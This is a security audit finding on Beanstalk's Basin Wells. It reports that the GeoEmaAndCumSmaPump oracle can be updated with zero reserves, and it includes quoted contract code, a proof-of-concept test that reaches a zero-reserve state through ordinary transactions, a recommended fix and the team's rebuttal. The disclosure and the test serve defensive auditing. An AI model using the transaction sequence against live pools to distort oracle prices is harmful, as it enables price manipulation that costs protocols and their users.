---
tags:
  - lang/solidity
  - sector/dex
  - sector/oracle
  - sector/token
  - platform/cyfrin
  - has/github
  - has/poc
  - severity/high
  - impact/data-corruption/price-manipulation
  - trigger/price-manipulation
protocol: "[[Beanstalk]]"
auditors:
  - "[[Hans]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-16-Beanstalk wells.md"
genome:
  - "[[manipulable-twap]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[trigger/price-manipulation]]"
  - "[[frontrun-exposure]]"
  - "[[oracle-manipulation-resistance]]"
  - "[[timestamp-dependence]]"
---
# Each Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0

- id: 18432
- impact: HIGH
- protocol: [[Beanstalk]] Wells
- reporter: Hans (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2023-06-16-Beanstalk wells.md

## Summary


This bug report is about the GeoEmaAndCumSmaPump implementation in the Basin project. This implementation assumes that each well will call the update() function with non-zero reserves, but there is no actual requirement to enforce this. This means that attackers can exploit this vulnerability to manipulate the price oracle. The recommended mitigation is to revert the pump updates if they are called with zero reserve values, however, the Beanstalk team have decided not to implement this. This is due to two changes that have been made to the pump structure, which are: 1) Have the Well not revert on Pump failure and 2) Don't initialize a Pump if any of the reserves are zero. The consequence of using a balance of 1 when the Pump intakes a balance of 0 should be minimal. The Cyfrin team have acknowledged this bug report.

## Details

**Description:** The current implementation of `GeoEmaAndCumSmaPump` assumes each well will call `update()` with non-zero reserves, as commented at the beginning of the file:

```solidity
/**
 * @title GeoEmaAndCumSmaPump
 * @author Publius
 * @notice Stores a geometric EMA and cumulative geometric SMA for each reserve.
 * @dev A Pump designed for use in Beanstalk with 2 tokens.
 *
 * This Pump has 3 main features:
 *  1. Multi-block MEV resistence reserves
 *  2. MEV-resistant Geometric EMA intended for instantaneous reserve queries
 *  3. MEV-resistant Cumulative Geometric intended for SMA reserve queries
 *
 * Note: If an `update` call is made with a reserve of 0, the Geometric mean oracles will be set to 0.
 * Each Well is responsible for ensuring that an `update` call cannot be made with a reserve of 0.
 */
 ```

However, there is no actual requirement in `Well` to enforce pump updates with valid reserve values. Given that `GeoEmaAndCumSmaPump` restricts values to a minimum of 1 to prevent issues with the geometric mean, that the TWA values are not truly representative of the reserves in the Well, we believe it is worse than reverting in this case, although a `ConstantProduct2` Well can have zero reserves for either token via valid transactions.

```solidity
GeoEmaAndCumSmaPump.sol
103:         for (uint i; i < length; ++i) {
104:             // Use a minimum of 1 for reserve. Geometric means will be set to 0 if a reserve is 0.
105:             b.lastReserves[i] =
106:                 _capReserve(b.lastReserves[i], (reserves[i] > 0 ? reserves[i] : 1).fromUIntToLog2(), blocksPassed);
107:             b.emaReserves[i] = b.lastReserves[i].mul((ABDKMathQuad.ONE.sub(aN))).add(b.emaReserves[i].mul(aN));
108:             b.cumulativeReserves[i] = b.cumulativeReserves[i].add(b.lastReserves[i].mul(deltaTimestampBytes));
109:         }
```

**Impact:** Updating pumps with zero reserve values can lead to the distortion of critical states likely to be utilized for price oracles. Given that the issue is exploitable through valid transactions, we assess the severity as HIGH. It is crucial to note that attackers can exploit this vulnerability to manipulate the price oracle.

**Proof of Concept:** The test below shows that it is possible for reserves to be zero through valid transactions and updating pumps do not revert.

```solidity
function testUpdateCalledWithZero() public {
    address msgSender = 0x83a740c22a319FBEe5F2FaD0E8Cd0053dC711a1A;
    changePrank(msgSender);
    IERC20[] memory mockTokens = well.tokens();

    // add liquidity 1 on each side
    uint amount = 1;
    MockToken(address(mockTokens[0])).mint(msgSender, 1);
    MockToken(address(mockTokens[1])).mint(msgSender, 1);
    MockToken(address(mockTokens[0])).approve(address(well), amount);
    MockToken(address(mockTokens[1])).approve(address(well), amount);
    uint[] memory tokenAmountsIn = new uint[](2);
    tokenAmountsIn[0] = amount;
    tokenAmountsIn[1] = amount;
    uint minLpAmountOut = well.getAddLiquidityOut(tokenAmountsIn);
    well.addLiquidity(
        tokenAmountsIn,
        minLpAmountOut,
        msgSender,
        block.timestamp
    );

    // swaFromFeeOnTransfer from token1 to token0
    msgSender = 0xfFfFFffFffffFFffFffFFFFFFfFFFfFfFFfFfFfD;
    changePrank(msgSender);
    amount = 79_228_162_514_264_337_593_543_950_334;
    MockToken(address(mockTokens[1])).mint(msgSender, amount);
    MockToken(address(mockTokens[1])).approve(address(well), amount);
    uint minAmountOut = well.getSwapOut(
        mockTokens[1],
        mockTokens[0],
        amount
    );

    well.swapFromFeeOnTransfer(
        mockTokens[1],
        mockTokens[0],
        amount,
        minAmountOut,
        msgSender,
        block.timestamp
    );
    increaseTime(120);

    // remove liquidity one token
    msgSender = address(this);
    changePrank(msgSender);
    amount = 999_999_999_999_999_999_999_999_999;
    uint minTokenAmountOut = well.getRemoveLiquidityOneTokenOut(
        amount,
        mockTokens[1]
    );
    well.removeLiquidityOneToken(
        amount,
        mockTokens[1],
        minTokenAmountOut,
        msgSender,
        block.timestamp
    );

    msgSender = address(12_345_678);
    changePrank(msgSender);

    vm.warp(block.timestamp + 1);
    amount = 1;
    MockToken(address(mockTokens[0])).mint(msgSender, amount);
    MockToken(address(mockTokens[0])).approve(address(well), amount);
    uint amountOut = well.getSwapOut(mockTokens[0], mockTokens[1], amount);

    uint[] memory reserves = well.getReserves();
    assertEq(reserves[1], 0);

    // we are calling `_update` with reserves of 0, this should fail
    well.swapFrom(
        mockTokens[0],
        mockTokens[1],
        amount,
        amountOut,
        msgSender,
        block.timestamp
    );
}
```

**Recommended Mitigation:** Revert the pump updates if they are called with zero reserve values.

**Beanstalk:** Have decided not to implement the recommended remediation. This is due to several factors. First, there have been two changes made to the pump structure:
1) Have the Well not revert on Pump failure (commit [2459058](https://github.com/BeanstalkFarms/Basin/commit/2459058979a1aeb5e146adf399c68358d2857dd6)). This was implemented to protect the Well against Pump failure. Without this change, if the Pump breaks for some reason, the liquidity will be permanently locked as all Well actions will fail.
2) Don’t initialize a Pump if any of the reserves are zero. This is to prevent the EMA and last balances from being initialized to zero. Instead, the Pump will just return and wait until it receives non-zero balances to initialize.

Due to 1), if the recommended remediation was implemented, then in the case where a balance of zero was passed in, the Well will continue to function, but the Pump will not be updated. Say a balance in the Well is 1e6, it is then set to 0 for an hour and then set back to 1e6. Because the Pump failed when the Well tried to update the Pump with the zero balance, it was not updated at all. Thus, the Pump will assume that the balance was 1e6 the whole time and not set to zero, which implies that the Pump is not an accurate measure of historical balances and could be manipulated (assuming the Well Function could use a balance of 0).

In addition, the difference between a balance of 1 and 0 is quite small. First, in neither case is the Well acting as a reliable source of price discovery. If there is only 1 micro-unit of an ERC-20 token in a Well, then there is essentially no bid to sell any more of that asset given the value of 1 micro-unit of an ERC-20 token is infinitesimal. For this reason, any protocol using the Pump should ensure that there is a sufficient balance of both ERC-20 tokens in the Well to ensure that it is an accurate source of price discovery. Therefore, the consequence of using a balance of 1 when the Pump intakes a balance of 0 should be minimal.

**Cyfrin:** Acknowledged.
